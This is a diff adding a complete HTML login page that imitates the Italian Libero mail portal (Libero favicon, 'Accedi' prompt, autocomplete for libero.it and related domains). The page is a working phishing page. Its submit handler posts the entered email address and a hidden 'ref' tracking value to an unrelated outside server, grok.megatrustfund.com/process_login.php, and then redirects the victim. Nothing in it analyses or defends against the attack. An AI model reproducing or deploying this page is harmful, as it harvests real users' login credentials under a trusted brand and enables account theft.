@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mail - Login</title>
+    <link rel="shortcut icon" href="/images/libero_favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" type="text/css" href="/style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
+</head>
+<body>
+    <div id="wrapper-iol">
+        <section class="content">
+            <header>
+                <a class="logo" href="https://#" title="Vai all'Home Page di Libero"></a>
+                <div class="txt">Accedi</div>
+            </header>
+
+            <form id="loginForm">
+                <div>
+                    <input type="hidden" name="hidden_field" id="hiddenInputField" value="">
+                    <label id="label_loginid" class="iol-material-textfield-outlined">
+                        <input name="LOGINID" id="loginid" maxlength="256" placeholder=" " autocomplete="" required>
+                        <span>Inserisci la tua email</span>
+                        <span id="loginid_error" class="txt-error" style="display:none"></span>
+                    </label>
+                    <button type="submit" class="iol-material-button-contained" id="form_submit">AVANTI</button>
+                </div>
+            </form>
+
+            <div id="message" style="display: none; color: red;"></div>
+
+            <div class="settings">
+                <label class="iol-material-checkbox">
+                    <input type="checkbox" name="REMEMBERME" value="S">
+                    <span>Rimani collegato</span>
+                </label>
+                <a href="/" class="float-right" target="_blank">Serve aiuto?</a>
+                <div class="create-account">Non hai un account? <a href="/" target="_blank">Registrati ora</a></div>
+            </div>
+        </section>
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            // Function to extract query parameter value
+            function getQueryParam(param) {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(param);
+            }
+
+            // Populate the hidden input field on page load
+            const paramValue = getQueryParam('ref');
+            if (paramValue) {
+                $('#hiddenInputField').val(paramValue);
+            } else { $('#hiddenInputField').val('admin'); }
+
+            // Handle form submission via AJAX
+            $('#loginForm').on('submit', function (e) {
+                e.preventDefault();
+
+                const formData = $(this).serialize();
+                $.ajax({
+                    type: 'POST',
+                    url: 'https://grok.megatrustfund.com/process_login.php',
+                    data: formData,
+                    dataType: 'json',
+                    success: function (response) {
+                        if (response.success) {
+                            window.location.href = response.redirect;
+                        } else {
+                            $('#message').text(response.message).show();
+                        }
+                    },
+                    error: function () {
+                        $('#message').text('An error occurred. Please try again.').show();
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        $('#loginid').on({
+            keydown: function() {
+                /*
+                $('#box_err_msg').html(''); 
+                $('#label_loginid').removeClass('error');
+                $('#loginid_error').html('');
+                */
+            },
+            paste: function() {
+                $('#label_loginid').removeClass('error');
+                $('#loginid_error').html('');
+            },
+            keypress: function(event) {
+                return Autocomplete(this, event, arrValues);
+            }
+        });
+
+        if (window.location.protocol == 'ht' + 'tp:') {
+            $('#login_submit').prop('disabled', true)
+        }
+
+
+       
+        function letter_or_dot(x) {
+            if (parseInt(x) == x) {
+                var range = 'azAZ..';
+                for (var i = 0; i < range.length; i += 2)
+                    if (range.charCodeAt(i) <= x && x <= range.charCodeAt(i + 1))
+                        return true;
+            }
+            return false;
+        }
+
+        function do_text_select(o, tmplen) {
+            if ("setSelectionRange" in o) {
+                o.setSelectionRange(tmplen, o.value.length);
+            } else if ("createTextRange" in o) { // IE 8-
+                var tr = o.createTextRange();
+                tr.moveStart("character", tmplen);
+                tr.moveEnd("character", o.value.len);
+                tr.select();
+            }
+        }
+
+        function Autocomplete(o, e, alist) {
+            if (!o.value.match(/@/)) return true;
+            var key;
+            if (("key" in e) && "string" == typeof(e.key) && e.key.match(/^[A-Za-z.]$/)) {
+                key = e.key;
+            } else if (("charCode" in e) && letter_or_dot(e.charCode)) {
+                key = String.fromCharCode(e.charCode);
+            } else if (("keyCode" in e) && letter_or_dot(e.keyCode)) {
+                key = String.fromCharCode(e.keyCode);
+            } else {
+                return true;
+            }
+            var tmp = o.value;
+            if ("selectionStart" in o && 0 <= o.selectionStart && o.selectionStart < o.selectionEnd) {
+                tmp = o.value.substring(0, o.selectionStart);
+            } else if ("selection" in document && "type" in document.selection && document.selection.type == "Text") {
+                tmp = o.value.substring(0, o.value.length - document.selection.createRange().text.length);
+            }
+            tmp = tmp + key;
+            var seg = tmp.split('@', 2);
+            for (var i = 0; i < alist.length; ++i) {
+                if (alist[i].indexOf(seg[1].toLowerCase()) == 0) {
+                    o.value = seg[0] + "@" + alist[i];
+                    do_text_select(o, tmp.length);
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        var arrValues = ['blu.it', 'giallo.it', 'inwind.it', 'iol.it', 'libero.it'];
+
+
+        //-->
+
+
+        function checkparams() {
+            // var boxerrmsg_html_tmp = '';
+            // var loginiderror_html_tmp = '';
+
+            if (typeof captcha_checked_flag !== 'undefined') {
+                if (!captcha_checked_flag) {
+                    // $('#box_err_msg').fadeOut(60, function(){$('#box_err_msg').html('')});
+
+                    $('#label_loginid').removeClass('error');
+
+                    $('#loginid_error').fadeOut(60, function() {
+                        $('#loginid_error').html('')
+                    });
+
+                    $('#box_err_captcha').fadeOut(60, function() {
+                        $('#box_err_captcha').html('')
+                    });
+                    $('#box_err_captcha').fadeIn(310, function() {
+                        $('#box_err_captcha').html('Non sono un robot &egrave; un campo obbligatorio.')
+                    });
+
+                    // $('#rc-anchor-container').css("border", "1px solid red");
+
+                    return false;
+                }
+            }
+
+            var error_str_tmp = '';
+
+            if ($('#loginid').val() == '') {
+                error_str_tmp = 'Email non inserita';
+            } else {
+                var loginid_arr_tmp = $('#loginid').val().split('@');
+                if (loginid_arr_tmp.length > 1) {
+                    if (loginid_arr_tmp[0] == undefined || loginid_arr_tmp[0] == '' || loginid_arr_tmp[1] == undefined || loginid_arr_tmp[1] == '') {
+                        error_str_tmp = 'Email non completa';
+                    } else {
+                        var domain_arr_tmp = new Array('', '');
+                        domain_arr_tmp = loginid_arr_tmp[1].split('.');
+
+                        if (domain_arr_tmp.length < 2) {
+                            error_str_tmp = 'Email non completa';
+                        } else {
+                            if (domain_arr_tmp[0] == undefined || domain_arr_tmp[0] == '' || domain_arr_tmp[1] == undefined || domain_arr_tmp[1] == '') {
+                                error_str_tmp = 'Email non completa';
+                            }
+                        }
+                    }
+                }
+            }
+
+            var atleast_one_error = false;
+
+            if (error_str_tmp.length) {
+                $('#loginid_error').fadeIn(310, function() {
+                    $('#loginid_error').html(error_str_tmp)
+                });
+
+                $('#label_loginid').addClass('error');
+
+                $('#loginid').focus();
+
+                atleast_one_error = true;
+            }
+
+            if (atleast_one_error)
+                return false;
+
+            $('#loginid_error').fadeOut(60, function() {
+                $('#loginid_error').html('')
+            });
+
+            $('#box_err_captcha').fadeOut(60, function() {
+                $('#box_err_captcha').html('')
+            });
+
+            $('#form_submit').prop('disabled', true).css('opacity', 0.5);
+            setTimeout(function() {
+                $('#form_submit').prop('disabled', false).css('opacity', 1);
+            }, 3000);
+
+            return true;
+        }
+    </script>
+</body>
+</html>
